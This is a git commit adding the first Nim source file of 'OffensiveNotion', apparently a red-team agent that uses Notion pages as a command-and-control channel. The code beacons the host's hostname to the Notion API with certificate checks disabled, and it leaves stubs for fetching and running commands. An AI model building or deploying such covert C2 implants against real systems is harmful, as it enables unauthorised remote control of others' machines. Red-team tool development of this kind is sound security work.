bd16f1b4ac34ba1a7ede95bcfcd2aa9d6c612b87
Michael Taggart <michael.t.taggart@gmail.com>
2022-01-20 16:30:42 -0800

    Nim src structure; working API call with idiot padding

---
+++ src/OffensiveNotion.nim
@@ -0,0 +1,112 @@
+import std/[
+    json,
+    asyncdispatch,
+    strformat, 
+    terminal,
+    net
+]
+import system
+import parseutils
+import os
+import nativesockets
+import httpclient
+import httpcore
+
+#[
+    Things we need to do:
+    Load the API key*
+    Start comms by making a new page*
+    Sleep* 
+    Get new blocks*
+    Any new commands?*
+    Do em*
+]#
+
+const URL_BASE = "https://api.notion.com/v1"
+const API_KEY_URL = "http://localhost:8888/api.txt"
+
+proc getConfigOptions(): (string, string) =
+    #[  
+        This procedure represents everything we would want to pull in from a config file at compile time.
+        TODO: look into TOML/YAML parsing
+    ]#
+    echo "[*] Enter agent sleep interval > "
+    let SLEEP_INTERVAL = readLine(stdin)
+
+    echo "[*] Enter the ID of the parent page > "
+    let PARENT_PAGE = readLine(stdin)
+
+    return (SLEEP_INTERVAL, PARENT_PAGE)
+
+
+# Create Agent Check-in Page
+proc createPage(headers: array[3, (string, string)], configs: tuple): Future[string] {.async.} =
+    let hostname = getHostname()
+    let url = fmt"{URL_BASE}/pages/"
+    # let proxy = newProxy("http://localhost:8080")
+
+    # Craft JSON body
+    var body = %*{
+        "parent":{
+          "type": "page_id",
+          "page_id": fmt"{configs[1]}" 
+          },
+        "properties": {
+            "title": [{
+                "text": {
+                  "content": hostname
+                }
+            }]
+          }
+      }
+    var bodyString: string = $body
+    system.add(bodyString, "++")
+    # echo "[*] JSON body:"
+    # echo bodyString
+    # Craft JSON request
+    let headers = newHttpHeaders(headers)
+    let client = newAsyncHttpClient(
+      headers=headers, 
+      # proxy=proxy, 
+      sslContext=newContext(verifyMode=CVerifyNone)
+    )
+    let res = await client.request(url, httpMethod = HttpPost, body = bodyString)
+    if res.status == Http200:
+      let page = await res.body
+      return parseJson(page)["id"].getStr()
+    echo res.status
+    echo await res.body
+    return ""
+
+proc getApiKey(url: string): Future[string] {.async.} =
+    let client = newAsyncHttpClient()
+    let r = await client.get(url)
+    result = await r.body
+
+# Get new blocks*
+
+# Any new commands?
+
+# Do em*
+
+
+proc main() {.async.} =
+    echo "[*] Offensive Notion! Because Reasons!"
+
+    let NOTION_API_KEY: string = await getApiKey(API_KEY_URL)
+
+    if NOTION_API_KEY != "":
+        echo "GOT THE API KEY"
+    
+    let configs = getConfigOptions()
+    let headers = {
+        "Notion-Version": "2021-08-16",
+        "Content-Type": "application/json",
+        "Authorization":  &"Bearer {NOTION_API_KEY}"
+    }
+    let pageId = await createPage(headers, configs)
+    echo pageId
+
+
+when isMainModule:
+    waitfor main()
